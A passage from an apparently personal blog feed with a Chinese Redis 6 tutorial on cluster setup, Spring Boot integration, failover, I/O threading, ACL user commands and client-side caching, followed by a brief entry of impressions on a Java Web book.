class="number">16386</span></span><br></pre></td></tr></table></figure><h2 id="Redis6-X节点高可用之Cluster集群三主三从搭建实战"><a href="#Redis6-X节点高可用之Cluster集群三主三从搭建实战" class="headerlink" title="Redis6.X节点高可用之Cluster集群三主三从搭建实战"></a>Redis6.X节点高可用之Cluster集群三主三从搭建实战</h2><ul><li>启动6个节点</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./redis-server ../conf/cluster/redis1.conf</span><br><span class="line">./redis-server ../conf/cluster/redis2.conf</span><br><span class="line">./redis-server ../conf/cluster/redis3.conf</span><br><span class="line">./redis-server ../conf/cluster/redis4.conf</span><br><span class="line">./redis-server ../conf/cluster/redis5.conf</span><br><span class="line">./redis-server ../conf/cluster/redis6.conf</span><br></pre></td></tr></table></figure><ul><li>加入集群(其中一个节点执行即可)<ul><li>–cluster 构建集群全部节点信息</li><li>–cluster-replicas 1 主从节点的比例，1表示1主1从的方式</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -a 123456 --cluster create 172.18.172.109:6381 172.18.172.109:6382 172.18.172.109:6383 172.18.172.109:6384 172.18.172.109:6385 172.18.172.109:6386 --cluster-replicas 1</span><br></pre></td></tr></table></figure><ul><li>检查状态信息(其中一个节点执行即可)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -a 123456 --cluster check 172.18.172.109:6381</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211025084857.png" alt="image-20211025084854956"></p><h2 id="Redis6-X节点高可用之Cluster集群读写命令"><a href="#Redis6-X节点高可用之Cluster集群读写命令" class="headerlink" title="Redis6.X节点高可用之Cluster集群读写命令"></a>Redis6.X节点高可用之Cluster集群读写命令</h2><ul><li>集群状态</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -c -a 123456 -p 6379</span><br><span class="line"></span><br><span class="line"><span class="comment">#集群信息</span></span><br><span class="line">cluster info</span><br><span class="line"></span><br><span class="line"><span class="comment">#节点信息</span></span><br><span class="line">cluster nodes</span><br></pre></td></tr></table></figure><ul><li><p>测试集群读写命令set/get</p><ul><li>key哈希运算计算槽位置</li><li>槽在当前节点的话直接插入/读取，否则自动转向到对应的节点</li></ul></li><li><p>操作都是主节点操作，从节点只是备份</p></li><li><p>流程解析</p><ul><li>启动应用</li><li>加入集群</li><li>从节点请求复制主节点（主从复制一样）<ul><li>先全量</li><li>再增量</li></ul></li></ul></li></ul><h2 id="Redis6-X节点高可用之Cluster集群整合SpringBoot2-X"><a href="#Redis6-X节点高可用之Cluster集群整合SpringBoot2-X" class="headerlink" title="Redis6.X节点高可用之Cluster集群整合SpringBoot2.X"></a>Redis6.X节点高可用之Cluster集群整合SpringBoot2.X</h2><p>不在同个网络，所以集群改为阿里云公网ip地址才可以访问</p><ul><li>公司开发部署都会用同个网络</li><li>配置文件修改</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#对外的ip</span></span><br><span class="line">cluster-announce-ip 8.129.113.233   </span><br><span class="line"><span class="comment">#对外端口</span></span><br><span class="line">cluster-announce-port   </span><br><span class="line"><span class="comment">#集群桥接端口</span></span><br><span class="line">cluster-announce-bus-port</span><br></pre></td></tr></table></figure><ul><li><p>动态修改配置</p><ul><li>config set cluster-announce-ip 8.129.113.233</li></ul></li><li><p>连接池添加 (之前添加）</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-pool2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>配置文件（注释Sentinel相关配置）</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cluster:</span></span><br><span class="line">   <span class="comment">#命名的最多转发次数</span></span><br><span class="line">     <span class="attr">max-redirects:</span> <span class="number">3</span></span><br><span class="line">     <span class="attr">nodes:</span> <span class="number">8.129</span><span class="number">.113</span><span class="number">.233</span><span class="string">:6381,8.129.113.233:6382,8.129.113.233:6383,8.129.113.233:6384,8.129.113.233:6385,8.129.113.233:6386</span></span><br></pre></td></tr></table></figure><h2 id="Redis6-X节点高可用之Cluster集群故障自动转移实战"><a href="#Redis6-X节点高可用之Cluster集群故障自动转移实战" class="headerlink" title="Redis6.X节点高可用之Cluster集群故障自动转移实战"></a><strong>Redis6.X节点高可用之Cluster集群故障自动转移实战</strong></h2><ul><li><p>集群里面有故障怎么办， 我们就来操作一遍</p></li><li><p>流程</p><ul><li>kill掉主节点</li><li>从节点成为新的master节点</li></ul></li><li><p>命令</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -c -a 123456 -p 6381</span><br><span class="line"></span><br><span class="line"><span class="comment">#集群信息</span></span><br><span class="line">cluster info</span><br><span class="line"></span><br><span class="line"><span class="comment">#节点信息</span></span><br><span class="line">cluster nodes</span><br></pre></td></tr></table></figure><ul><li>高可用架构总结<ul><li>主从模式：读写分离，备份，一个Master可以有多个Slaves</li><li>哨兵sentinel：监控，自动转移，哨兵发现主服务器挂了后，就会从slave中重新选举一个主服务器</li><li>集群： 为了解决单机Redis容量有限的问题，将数据按一定的规则分配到多台机器，内存/QPS不受限于单机，提高并发量。</li></ul></li></ul><h1 id="分布式缓存Redis6-X新特性"><a href="#分布式缓存Redis6-X新特性" class="headerlink" title="分布式缓存Redis6.X新特性"></a>分布式缓存Redis6.X新特性</h1><h2 id="多线程介绍"><a href="#多线程介绍" class="headerlink" title="多线程介绍"></a>多线程介绍</h2><p>新版Redis6特性讲解</p><ul><li>支持多线程<ul><li>redis6多线程只是用来处理网络数据的读写和协议解析上，底层数据操作还是单线程</li><li>执行命令仍然是单线程，之所以这么设计是不想因为多线程而变得复杂，需要去控制 key、lua、事务，LPUSH/LPOP 等等的并发问题</li><li>默认不开启</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io-threads-do-reads yes</span><br><span class="line">io-threads 线程数</span><br></pre></td></tr></table></figure><ul><li>官方建议 ( 线程数小于机器核数 )<ul><li>4 核的机器建议设置为 2 或 3 个线程</li><li>8 核的建议设置为 4或6个线程</li></ul></li><li>开启多线程后，是否会存在线程并发安全问题？</li><li>不会有安全问题，Redis 的多线程部分只是用来处理网络数据的读写和协议解析，执行命令仍然是单线程顺序执行。</li></ul><h2 id="Access-Control-List权限控制"><a href="#Access-Control-List权限控制" class="headerlink" title="Access Control List权限控制"></a>Access Control List权限控制</h2><p>引入了 ACL（Access Control List)</p><ul><li><p>之前的redis没有用户的概念，redis6引入了acl</p></li><li><p>可以给每个用户分配不同的权限来控制权限</p></li><li><p>通过限制对命令和密钥的访问来提高安全性，以使不受信任的客户端无法访问</p></li><li><p>提高操作安全性，以防止由于软件错误或人为错误而导致进程或人员访问 Redis，从而损坏数据或配置</p></li><li><p>文档：<a href="https://redis.io/topics/acl" target="_blank" rel="noopener">https://redis.io/topics/acl</a></p></li><li><p>常用命令</p><ul><li>acl list 当前启用的 ACL 规则</li><li>acl cat 支持的权限分类列表</li><li>acl cat hash 返回指定类别中的命令</li><li>acl setuser 创建和修改用户命令</li><li>acl deluser 删除用户命令</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+&lt;command&gt; 将命令添加到用户可以调用的命令列表中，如+@hash</span><br><span class="line">-&lt;command&gt; 将命令从用户可以调用的命令列表中移除</span><br><span class="line"></span><br><span class="line">#切换默认用户</span><br><span class="line">auth default 123456</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#例子 密码 123 ，全部key，全部权限</span><br><span class="line">acl setuser jack on &gt;123 ~* +@all</span><br><span class="line"></span><br><span class="line">#例子 密码 123 ，全部key，get权限</span><br><span class="line">acl setuser jack on &gt;123 ~* +get</span><br></pre></td></tr></table></figure><table><thead><tr><th>参 数</th><th>说明</th></tr></thead><tbody><tr><td>user</td><td>用户</td></tr><tr><td>default</td><td>表示默认用户名，或则自己定义的用户名</td></tr><tr><td>on</td><td>表示是否启用该用户，默认为off（禁用）</td></tr><tr><td>#…</td><td>表示用户密码，nopass表示不需要密码</td></tr><tr><td>~*</td><td>表示可以访问的Key（正则匹配）</td></tr><tr><td>+@</td><td>表示用户的权限，“+”表示授权权限，有权限操作或访问，“-”表示还是没有权限； @为权限分类，可以通过 <code>ACL CAT</code> 查询支持的分类。+@all 表示所有权限，nocommands 表示不给与任何命令的操作权限</td></tr></tbody></table><h2 id="新版Redis6核心特性-Client-Side-Caching-客户端缓存"><a href="#新版Redis6核心特性-Client-Side-Caching-客户端缓存" class="headerlink" title="新版Redis6核心特性-Client-Side-Caching 客户端缓存"></a>新版Redis6核心特性-Client-Side-Caching 客户端缓存</h2><p>client side caching客户端缓存</p><ul><li><p>类似浏览器缓存一样</p><ul><li>在服务器端更新了静态文件（如css、js、图片），能够在客户端得到及时的更新，但又不想让浏览器每次请求都从服务器端获取静态资源</li><li>类似前端的-Expires、Last-Modified、Etag缓存控制</li></ul></li><li><p>文档：<a href="https://redis.io/topics/client-side-caching" target="_blank" rel="noopener">https://redis.io/topics/client-side-caching</a></p></li></ul><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211025092900.png" alt="image-20211025092849735" style="zoom: 80%;" /><p>详细: 分为两种模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis在服务端记录访问的连接和相关的key， 当key有变化时通知相应的应用</span><br><span class="line">应用收到请求后自行处理有变化的key, 进而实现client cache与redis的一致</span><br><span class="line">这需要客户端实现，目前lettuce对其进行了支持</span><br></pre></td></tr></table></figure><ul><li><p>默认模式</p><ul><li>Server 端全局唯一的表（<strong>Invalidation Table</strong>）记录每个Client访问的Key，当发生变更时，向client推送数据过期消息。<ul><li>优点：只对Client发送其访问过的被修改的数据</li><li>缺点：Server端需要额外存储较大的数据量</li></ul></li></ul></li><li><p>广播模式</p><ul><li>客户端订阅key前缀的广播，服务端记录key前缀与client的对应关系。当相匹配的key发生变化时通知client。</li><li>优点：服务端记录信息比较少</li><li>缺点：client会收到自己未访问过的key的失效通知</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis6安装&quot;&gt;&lt;a href=&quot;#Redis6安装&quot; class=&quot;headerlink&quot; title=&quot;Redis6安装&quot;&gt;&lt;/a&gt;Redis6安装&lt;/h1&gt;&lt;h2 id=&quot;队列和缓存&quot;&gt;&lt;a href=&quot;#队列和缓存&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="Redis" scheme="https://blog.kaluna.top/categories/Redis/"/>
    
    
      <category term="Redis" scheme="https://blog.kaluna.top/tags/Redis/"/>
    
      <category term="高可用集群" scheme="https://blog.kaluna.top/tags/%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4/"/>
    
  </entry>
  
  <entry>
    <title>粗读&amp;初读《深入分析Java Web技术内幕》</title>
    <link href="https://blog.kaluna.top/2021/05/15/%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90Java%20%20Web%E6%8A%80%E6%9C%AF%E5%86%85%E5%B9%95/"/>
    <id>https://blog.kaluna.top/2021/05/15/%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90Java%20%20Web%E6%8A%80%E6%9C%AF%E5%86%85%E5%B9%95/</id>
    <published>2021-05-15T03:44:33.514Z</published>
    <updated>2021-06-11T10:38:10.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h1><p>2021/5/23</p><p>用了一周的时间，终于看完了，我看的是许令波那一本《深入分析Java Web技术内幕》，总的来说作者经验很丰富。对于我这种新手来说，琢磨源码还是有点困难。书中有很多理论是围绕源码在展开，但是如果从未看过源码的人看了这本书，同时也没有自己主动琢磨，看一些博文加以理解或者没有总结的话，看了这本书也相当于白看。建议要看这本书的同学，先把设计模式学了，因为这本书的后面是把设计模式和框架一起结合着讲，先学完设计模式，再看这本书，一定收获更大。</p><p>2021/6/11</p><p>呜呜，我已经把书看完很久了，还没总结，我觉得我要忘光光了，但是如果现在总结就要和我目前的时间安排起冲突，我暑假再看看啦。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;感受&quot;&gt;&lt;a href=&quot;#感受&quot; class=&quot;headerlink&quot; title=&quot;感受&quot;&gt;&lt;/a&gt;感受&lt;/h1&gt;&lt;p&gt;2021/5/23&lt;/p&gt;
&lt;p&gt;用了一周的时间，终于看完了，我看的是许令波那一本《深入分析Java Web技术内幕》，总的来说作者经验很丰
      
    
    </summary>
    
    
      <category term="读后感" scheme="https://blog.kaluna.top/categories/%E8%AF%BB%E5%90%8E%E6%84%9F/"/>
    
    
  </entry>
  
</feed>
